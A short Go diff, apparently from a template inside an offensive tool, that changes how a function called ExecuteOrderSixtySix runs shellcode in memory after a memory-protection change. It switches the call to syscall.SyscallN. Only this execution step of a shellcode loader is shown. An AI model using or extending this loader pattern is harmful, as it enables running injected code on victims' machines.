@@ -82,7 +82,7 @@ func ExecuteOrderSixtySix(shellcode []byte) {
         uintptr(unsafe.Pointer(&oldProtect)),
     )
 
-	_, _, _ = syscall.Syscall(addr, 0, 0, 0, 0)
+	_, _, _ = syscall.SyscallN(addr)
 
 }
     `)
